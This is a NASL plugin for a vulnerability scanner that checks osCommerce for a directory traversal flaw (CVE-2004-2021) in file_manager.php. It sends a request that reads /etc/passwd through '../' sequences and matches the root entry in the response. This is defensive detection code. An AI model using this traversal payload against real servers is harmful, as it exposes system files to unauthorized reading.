#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref:  Rene <l0om@excluded.org> and Megasky <magasky@hotmail.com>
#
# This script is released under the GNU GPL v2
#


include("compat.inc");

if (description)
{
 script_id(17595);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2004-2021");
 script_bugtraq_id(10364);
 script_xref(name:"OSVDB", value:"6308");

 script_name(english:"osCommerce file_manager.php filename Variable Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host is running osCommerce, a widely installed open source 
shopping e-commerce solution.

The remote version of this software is vulnerable to a directory traversal 
flaw which may be exploited by an attacker to read arbitrary files
on the remote server with the privileges of the web server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to a newer version of this software" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 script_summary(english:"Determine if osCommerce is vulnerable to dir traversal");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (!get_port_state(port))exit(0);
if (!can_host_php(port:port)) exit(0);

dir = make_list(cgi_dirs());

foreach d (dir)
{
 url = string(d, "/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL ) exit(0);

 if (egrep(pattern:"root:0:[01]:.*", string:buf))
 {
   security_warning(port:port);
   exit(0);
 }
}
